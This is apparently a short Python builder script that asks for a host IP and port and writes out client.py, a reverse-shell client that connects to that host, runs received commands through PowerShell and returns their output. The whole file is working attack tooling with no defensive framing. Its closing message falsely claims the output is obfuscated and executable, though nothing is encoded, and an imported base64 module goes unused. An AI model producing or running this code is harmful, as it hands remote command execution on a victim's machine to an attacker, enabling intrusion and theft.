import base64
import os

# Get user input for HOST and PORT
host = input("Enter the HOST IP: ")
port = input("Enter the PORT number: ")

# Replace HOST and PORT in the code
code = """
import os
import socket
import subprocess

HOST = '{}' 
PORT = {}
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))
while True:
    command = client_socket.recv(1024).decode()
    try:
        command_output = subprocess.check_output("powershell.exe " + command, shell=True)
        client_socket.send(command_output)
    except subprocess.CalledProcessError as error:
        client_socket.send(str(error).encode())
    except Exception as e:
        client_socket.send(str(e).encode())
client_socket.close()
"""
code = code.format(host, port)
# Create the file
with open("client.py", "w") as file:
    file.write(code)
# Print message
print("File created with obfuscated code and executable.")
